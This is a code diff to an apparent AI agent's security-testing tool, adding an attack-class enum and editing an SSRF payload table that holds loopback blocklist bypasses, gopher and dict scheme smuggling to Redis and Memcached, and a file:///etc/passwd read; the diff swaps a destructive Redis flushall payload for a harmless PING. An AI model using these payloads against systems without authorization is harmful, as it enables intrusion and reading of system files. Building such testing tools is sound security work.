@@ -36,9 +36,15 @@ func (*attackKitTool) Schema() map[string]any {
 	return map[string]any{
 		"type": "object",
 		"properties": map[string]any{
+			// The enum is built from the payload table itself, so the
+			// advertised set can never drift from the accepted one. A prose
+			// list did drift: a real run called class="idor" (a vocabulary
+			// propose_candidate does accept) and burned a turn on the
+			// rejection.
 			"class": map[string]any{
 				"type":        "string",
-				"description": "Attack class. Omit to list available classes. One of: xss, sqli, ssrf, cmd-injection, path-traversal, ssti, xxe, open-redirect, crlf.",
+				"enum":        attackClasses,
+				"description": "Attack class. Omit to list available classes.",
 			},
 		},
 	}
@@ -95,7 +101,7 @@ var attackPayloads = map[string][]kitPayload{
 		{Payload: `http://0.0.0.0/`, Note: "Quad-zero loopback — bypasses common 127.* blocklists."},
 		{Payload: `http://2130706433/`, Note: "Decimal-encoded 127.0.0.1 — bypasses string blocklists."},
 		{Payload: `http://127.1/`, Note: "Short-form loopback (some libs expand). Bypasses naive regex."},
-		{Payload: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`, Note: "Gopher protocol smuggling — Redis flushall PoC. Tests for unrestricted scheme handling."},
+		{Payload: `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a`, Note: "Gopher protocol smuggling — harmless Redis PING probe (expect +PONG). Tests for unrestricted scheme handling without mutating data. Escalate to intrusive commands only under explicit operator authorization."},
 		{Payload: `file:///etc/passwd`, Note: "Local file inclusion via file:// scheme. Look for Unix passwd content in response."},
 		{Payload: `dict://127.0.0.1:11211/stats`, Note: "Memcached stats probe via dict:// scheme."},
 	},
